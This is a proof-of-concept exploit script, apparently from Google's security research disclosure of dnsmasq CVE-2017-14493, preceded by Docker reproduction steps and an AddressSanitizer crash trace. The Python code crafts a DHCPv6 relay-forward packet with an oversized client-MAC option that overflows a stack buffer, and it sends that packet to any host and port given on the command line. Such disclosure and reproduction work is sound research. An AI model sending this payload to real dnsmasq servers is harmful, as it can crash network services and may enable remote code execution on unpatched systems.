'''
Sources:
https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14493.py
https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html

1) Build the docker and open two terminals

docker build -t dnsmasq .
docker run --rm -t -i --name dnsmasq_test dnsmasq bash
docker cp poc.py dnsmasq_test:/poc.py
docker exec -it <container_id> bash

2) On one terminal start dnsmasq:

# /test/dnsmasq_noasn/src/dnsmasq --no-daemon --dhcp-range=fd00::2,fd00::ff
dnsmasq: started, version 2.78test2-8-ga3303e1 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth no-DNSSEC loop-detect inotify
dnsmasq-dhcp: DHCPv6, IP range fd00::2 -- fd00::ff, lease time 1h
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: read /etc/hosts - 7 addresses


3) On another terminal start the PoC:

# python /poc.py ::1 547
[+] sending 70 bytes to ::1:547

4) Dnsmasq will output the following: Segmentation fault (core dumped)

==33==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffcbef81470 at pc 0x0000004b5408 bp 0x7ffcbef81290 sp 0x7ffcbef80a40
WRITE of size 30 at 0x7ffcbef81470 thread T0
    #0 0x4b5407 in __asan_memcpy (/test/dnsmasq/src/dnsmasq+0x4b5407)
    #1 0x575d38 in dhcp6_maybe_relay /test/dnsmasq/src/rfc3315.c:211:7
    #2 0x575378 in dhcp6_reply /test/dnsmasq/src/rfc3315.c:103:7
    #3 0x571080 in dhcp6_packet /test/dnsmasq/src/dhcp6.c:233:14
    #4 0x544a82 in main /test/dnsmasq/src/dnsmasq.c:1061:2
    #5 0x7f93e5da62b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
    #6 0x41cbe9 in _start (/test/dnsmasq/src/dnsmasq+0x41cbe9)

Address 0x7ffcbef81470 is located in stack of thread T0 at offset 208 in frame
    #0 0x57507f in dhcp6_reply /test/dnsmasq/src/rfc3315.c:78

  This frame has 1 object(s):
    [32, 208) 'state' <== Memory access at offset 208 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/test/dnsmasq/src/dnsmasq+0x4b5407) in __asan_memcpy
Shadow bytes around the buggy address:
  0x100017de8230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100017de8240: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100017de8250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100017de8260: f1 f1 f1 f1 00 00 f3 f3 00 00 00 00 00 00 00 00
  0x100017de8270: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
=>0x100017de8280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00[f3]f3
  0x100017de8290: f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00
  0x100017de82a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100017de82b0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
  0x100017de82c0: 00 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2
  0x100017de82d0: 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==33==ABORTING
'''

#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

from struct import pack
import sys
import socket

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, "A" * 74 + pack("<Q", 0x1337DEADBEEF)),
    ])

    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))